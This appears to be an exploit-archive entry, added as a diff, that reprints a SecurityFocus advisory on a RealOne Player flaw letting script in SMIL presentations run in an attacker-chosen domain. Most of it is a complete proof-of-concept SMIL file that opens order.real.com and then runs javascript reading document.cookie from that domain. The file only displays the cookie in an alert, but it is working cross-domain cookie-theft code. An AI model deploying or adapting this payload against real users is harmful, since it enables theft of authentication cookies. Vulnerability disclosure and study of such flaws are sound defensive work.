@@ -1,0 +1,38 @@
+source: http://www.securityfocus.com/bid/8453/info
+
+Real Networks has reported a vulnerability in RealOne Player. Script embedded in SMIL presentations may be executed in the context of a domain that is specified by an attacker. This could allow for theft of cookie-based authentication credentials or other attacks.
+
+This vulnerability could also be exploited to execute script code in the context of the My Computer Zone, which could lead to installation and execution of malicious code on the client systems. This has been demonstrated with a newly reported vulnerability that is a variant of this issue (BID 9378), making it possible to exploit this issue to the same ends as the new vulnerability.
+
+This issue is believed to affect RealOne Player for Microsoft Windows operating systems.
+
+
+We have created a SMIL file that will read the cookie from
+https://order.real.com/pt/order.html. The cookie will be read 9 seconds
+after the audio has begun.
+
+Source Code:
+<smil xmlns="http://www.w3.org/2001/SMIL20/Language"
+xmlns:rn="http://features.real.com/2001/SMIL20/Extensions">
+<head>
+<meta name="title" content="DigitalPranksters.com Proof of Concept"/>
+<meta name="author" content="DigitalPranksters.com"/>
+<meta name="copyright" content="(c)2003 DigitalPranksters.com"/>
+</head>
+<body>
+<audio
+src="http://radio.real.com/RGX/def.def...RGX/www.smgradio.com/core/audio/real/live.ram?service=vr">
+<area href="https://order.real.com/pt/order.html" begin="1s"
+external="true" actuate="onLoad" sourcePlaystate="play"
+rn:sendTo="_rpcontextwin">
+<rn:param name="width" value="10"/>
+<rn:param name="height" value="10"/>
+</area>
+<area href="javascript:alert('Hi there! I\'m a digital prankster. I
+just read your cookie from ' + document.domain + ' over the ' +
+location.protocol + '// protocol.\n\nThe value was:\n' + document.cookie +
+'\n\nHave a nice day.')" begin="9s" external="true" actuate="onLoad"
+sourcePlaystate="play" rn:sendTo="_rpcontextwin"/>
+</audio>
+</body>
+</smil> 
